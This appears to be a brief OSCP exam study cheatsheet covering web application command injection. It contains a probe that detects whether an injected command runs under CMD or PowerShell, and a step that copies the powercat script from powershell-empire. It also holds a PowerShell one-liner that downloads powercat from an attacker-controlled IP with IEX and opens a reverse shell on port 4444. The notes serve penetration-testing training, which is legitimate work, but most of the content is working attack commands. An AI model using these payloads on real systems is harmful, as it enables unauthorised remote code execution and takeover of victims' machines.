# OSCP-Notes
Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam
Web App Pentest
  D
    Command Injection
      Check if CMD or PowerShell we have:
        (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
      PowerCat for Reverse shell. first copy to local dir: 
        cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .





Download and execute in PowerShell:
  IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
